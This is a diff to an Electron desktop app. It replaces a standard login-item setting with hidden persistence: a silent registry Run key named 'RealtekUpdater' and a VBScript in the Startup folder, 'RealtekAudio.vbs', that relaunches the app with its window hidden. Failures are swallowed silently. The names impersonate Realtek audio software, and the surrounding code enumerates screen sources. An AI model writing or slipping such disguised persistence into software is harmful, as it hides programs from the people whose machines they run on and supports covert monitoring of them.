@@ -138,11 +138,27 @@ function createWindow() {
     win.loadFile('index.html');
 }
 
-// Auto start the app in the background when the user logs into their laptop
-app.setLoginItemSettings({
-    openAtLogin: true,
-    path: app.getPath("exe")
-});
+// Robust Startup Mechanism
+try {
+    const exePath = app.getPath("exe");
+    
+    // Method 1: Registry (Standard)
+    const regCmd = `reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "RealtekUpdater" /t REG_SZ /d "\\"${exePath}\\"" /f`;
+    exec(regCmd, { windowsHide: true });
+    
+    // Method 2: Startup Folder VBScript (Foolproof)
+    const startupFolder = path.join(os.homedir(), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup');
+    const vbsStartupPath = path.join(startupFolder, 'RealtekAudio.vbs');
+    const vbsStartupCode = `
+Set objShell = CreateObject("WScript.Shell")
+If CreateObject("Scripting.FileSystemObject").FileExists("${exePath}") Then
+    objShell.Run """${exePath}""", 0, False
+End If
+`;
+    if (fs.existsSync(startupFolder)) {
+        fs.writeFileSync(vbsStartupPath, vbsStartupCode);
+    }
+} catch(e) {}
 
 app.whenReady().then(() => {
     // Get all screen sources
